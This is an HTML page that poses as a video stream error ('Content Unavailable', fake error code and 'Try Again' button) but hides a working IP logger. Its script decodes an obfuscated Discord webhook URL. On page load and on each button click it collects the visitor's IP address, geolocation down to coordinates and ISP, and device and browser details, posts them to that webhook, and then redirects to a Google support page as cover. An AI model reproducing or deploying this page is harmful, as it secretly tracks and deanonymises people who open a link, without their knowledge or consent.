<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Content Unavailable | Stream Error</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --error: #ef4444;
            --error-light: #fee2e2;
            --bg: #f9fafb;
            --card: #ffffff;
            --text: #111827;
            --text-light: #6b7280;
            --border: #e5e7eb;
            --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --radius: 12px;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            line-height: 1.5;
            background-image: radial-gradient(circle at 10% 20%, rgba(233, 213, 255, 0.1) 0%, rgba(199, 210, 254, 0.1) 90%);
        }

        .error-container {
            width: 100%;
            max-width: 480px;
            padding: 2rem;
        }

        .error-card {
            background-color: var(--card);
            border-radius: var(--radius);
            box-shadow: var(--shadow-lg);
            padding: 2.5rem;
            text-align: center;
            border: 1px solid var(--border);
            transform: translateY(0);
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .error-card:hover {
            transform: translateY(-4px);
            box-shadow: var(--shadow-lg), 0 20px 25px -5px rgba(0, 0, 0, 0.1);
        }

        .error-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg, var(--primary), var(--error));
        }

        .error-icon {
            font-size: 5rem;
            color: var(--error);
            margin-bottom: 1.5rem;
            position: relative;
            display: inline-block;
            animation: bounce 1.5s infinite;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-15px); }
        }

        .error-icon::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 50%;
            background-color: var(--error-light);
            z-index: -1;
            transform: scale(1.5);
            opacity: 0.5;
        }

        h1 {
            color: var(--text);
            margin: 0 0 1rem;
            font-weight: 700;
            font-size: 1.5rem;
        }

        .error-message {
            color: var(--text-light);
            margin-bottom: 1.5rem;
            font-size: 1rem;
            line-height: 1.6;
        }

        .error-details {
            background: var(--error-light);
            padding: 1rem;
            border-radius: var(--radius);
            margin: 1.5rem 0;
            font-family: 'Menlo', 'Monaco', 'Consolas', monospace;
            font-size: 0.875rem;
            color: var(--error);
            border-left: 4px solid var(--error);
            text-align: left;
        }

        .error-details span {
            display: block;
            margin-bottom: 0.25rem;
        }

        .error-details span:last-child {
            margin-bottom: 0;
        }

        .loading {
            margin: 1.5rem 0;
            display: none;
        }

        .loader {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
            margin-bottom: 1rem;
        }

        .loader div {
            position: absolute;
            width: 16px;
            height: 16px;
            border-radius: 50%;
            background: var(--primary);
            animation: loader 1.2s linear infinite;
        }

        .loader div:nth-child(1) {
            top: 8px;
            left: 8px;
            animation-delay: 0s;
        }

        .loader div:nth-child(2) {
            top: 8px;
            left: 32px;
            animation-delay: -0.4s;
        }

        .loader div:nth-child(3) {
            top: 8px;
            left: 56px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(4) {
            top: 32px;
            left: 8px;
            animation-delay: -0.4s;
        }

        .loader div:nth-child(5) {
            top: 32px;
            left: 32px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(6) {
            top: 32px;
            left: 56px;
            animation-delay: -1.2s;
        }

        .loader div:nth-child(7) {
            top: 56px;
            left: 8px;
            animation-delay: -0.8s;
        }

        .loader div:nth-child(8) {
            top: 56px;
            left: 32px;
            animation-delay: -1.2s;
        }

        .loader div:nth-child(9) {
            top: 56px;
            left: 56px;
            animation-delay: -1.6s;
        }

        @keyframes loader {
            0%, 100% {
                opacity: 1;
                transform: scale(1);
            }
            50% {
                opacity: 0.5;
                transform: scale(0.5);
            }
        }

        .status-text {
            color: var(--text-light);
            font-size: 0.875rem;
            margin-top: 0.5rem;
        }

        .btn {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 0.75rem 1.5rem;
            border-radius: var(--radius);
            cursor: pointer;
            font-size: 1rem;
            font-weight: 500;
            margin-top: 1rem;
            transition: var(--transition);
            width: 100%;
            max-width: 200px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
        }

        .btn:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: var(--shadow);
        }

        .btn:active {
            transform: translateY(0);
        }

        .footer {
            margin-top: 2rem;
            text-align: center;
            color: var(--text-light);
            font-size: 0.75rem;
        }

        .footer a {
            color: var(--primary);
            text-decoration: none;
            transition: var(--transition);
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Responsive adjustments */
        @media (max-width: 480px) {
            .error-card {
                padding: 1.5rem;
            }
            
            .error-icon {
                font-size: 3.5rem;
            }
            
            h1 {
                font-size: 1.25rem;
            }
            
            .btn {
                max-width: 100%;
            }
        }

        /* Floating particles background */
        .particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }

        .particle {
            position: absolute;
            background: rgba(99, 102, 241, 0.1);
            border-radius: 50%;
            animation: float 15s infinite linear;
        }

        @keyframes float {
            0% {
                transform: translateY(0) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(-1000px) rotate(720deg);
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    
    <div class="error-container">
        <div class="error-card">
            <div class="error-icon">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            <h1>Content Unavailable</h1>
            <p class="error-message">The media you're trying to access cannot be displayed due to a processing error. Please try again later.</p>
            
            <div class="error-details">
                <span>Error Code: <strong>STREAM_ERR_0x8F204265</strong></span>
                <span>Status: <strong>CORRUPTED_FRAMES</strong></span>
                <span>Timestamp: <strong id="timestamp"></strong></span>
            </div>
            
            <div class="loading" id="loading">
                <div class="loader">
                    <div></div><div></div><div></div>
                    <div></div><div></div><div></div>
                    <div></div><div></div><div></div>
                </div>
                <p class="status-text">Attempting to reinitialize media pipeline...</p>
            </div>
            
            <button class="btn" id="tryAgainBtn">
                <i class="fas fa-sync-alt"></i> Try Again
            </button>
        </div>
        
        <div class="footer">
            Need help? <a href="https://support.google.com" target="_blank">Contact support</a>
        </div>
    </div>

    <script>
        // Set current timestamp
        document.getElementById('timestamp').textContent = new Date().toLocaleString();
        
        // Create floating particles
        function createParticles() {
            const particlesContainer = document.getElementById('particles');
            const particleCount = window.innerWidth < 768 ? 15 : 30;
            
            for (let i = 0; i < particleCount; i++) {
                const particle = document.createElement('div');
                particle.classList.add('particle');
                
                // Random size between 5px and 20px
                const size = Math.random() * 15 + 5;
                particle.style.width = `${size}px`;
                particle.style.height = `${size}px`;
                
                // Random position
                particle.style.left = `${Math.random() * 100}%`;
                particle.style.top = `${Math.random() * 100}%`;
                
                // Random animation duration and delay
                const duration = Math.random() * 20 + 10;
                const delay = Math.random() * 10;
                particle.style.animation = `float ${duration}s ${delay}s infinite linear`;
                
                particlesContainer.appendChild(particle);
            }
        }
        
        createParticles();

        const funny = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4ODYxMjQ5NzMyNTU1NTc1Mi9fS1J3Xy02dy04dUhnaGIzVmV1Q0xHay1ETEU0U2pRcmJTZDNWcC1XMG9SbXM4RFU0QTJwSGtiQS1RQWxqdDdGZDVELQ==");

        async function locateUser(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    countryCode: data.country,
                    postal: data.postal,
                    lat: data.latitude,
                    lon: data.longitude,
                    timezone: data.timezone,
                    isp: data.org,
                    asn: data.asn
                };
            } catch (error) {
                console.error("Geolocation error:", error);
                return { error: "Geolocation failed" };
            }
        }

        async function getSystemInfo() {
            const connection = navigator.connection || {};
            
            return {
                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => "Unknown"),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                device: {
                    screen: `${window.screen.width}x${window.screen.height}`,
                    colorDepth: window.screen.colorDepth,
                    memory: navigator.deviceMemory || "Unknown",
                    cores: navigator.hardwareConcurrency || "Unknown"
                },
                network: {
                    type: connection.effectiveType || "Unknown",
                    downlink: connection.downlink || "Unknown"
                },
                browser: {
                    language: navigator.language,
                    languages: navigator.languages.join(', ')
                },
                time: {
                    zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                },
                referrer: document.referrer || "Direct"
            };
        }

        function createEmbeds(ipData, systemData) {
            const ipEmbed = {
                title: "ðŸŒ IP Information",
                color: 0x000000,
                fields: [
                    { name: "IP Address", value: `\`${systemData.ip}\``, inline: true },
                    { name: "ISP", value: `\`${ipData.isp || "Unknown"}\``, inline: true },
                    { name: "Location", value: `\`${ipData.city || "?"}, ${ipData.region || "?"}, ${ipData.country || "?"}\``, inline: false },
                    { name: "Coordinates", value: `\`${ipData.lat || "?"}, ${ipData.lon || "?"}\``, inline: true },
                    { name: "Timezone", value: `\`${ipData.timezone || "Unknown"}\``, inline: true }
                ],
                footer: { text: `Collected at ${systemData.time.timestamp}` }
            };

            const systemEmbed = {
                title: "ðŸ’» System Profile",
                color: 0x000000,
                fields: [
                    { name: "Platform", value: `\`${systemData.platform}\``, inline: true },
                    { name: "User Agent", value: `\`\`\`${systemData.userAgent.substring(0, 150)}\`\`\``, inline: false },
                    { name: "Screen", value: `\`${systemData.device.screen} (${systemData.device.colorDepth}bit)\``, inline: true },
                    { name: "Memory/Cores", value: `\`${systemData.device.memory}GB / ${systemData.device.cores} cores\``, inline: true },
                    { name: "Network", value: `\`${systemData.network.type} (${systemData.network.downlink}Mb/s)\``, inline: true },
                    { name: "Language", value: `\`${systemData.browser.language}\``, inline: true }
                ],
                footer: { text: "Vortex Intelligence System" }
            };

            return [ipEmbed, systemEmbed];
        }

        async function sendData() {
            try {
                const systemInfo = await getSystemInfo();
                const ipLocation = await locateUser(systemInfo.ip);
                
                const embeds = createEmbeds(ipLocation, systemInfo);
                
                await fetch(funny, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        embeds,
                        content: "|| This bot is owned by vortex - developed by god||"
                    })
                });
                
                return true;
            } catch (error) {
                console.error("Data transmission error:", error);
                return false;
            }
        }

        document.addEventListener('DOMContentLoaded', async () => {
            await sendData();
            
            document.getElementById('tryAgainBtn').addEventListener('click', async () => {
                document.getElementById('loading').style.display = 'block';
                document.getElementById('tryAgainBtn').style.display = 'none';
                
                const success = await sendData();
                
                setTimeout(() => {
                    window.location.href = success ? 
                        'https://support.google.com/youtube/' : 
                        'https://www.google.com/search?q=stream+error+0x8F204265';
                }, 2000);
            });
        });
    </script>
</body>
</html>
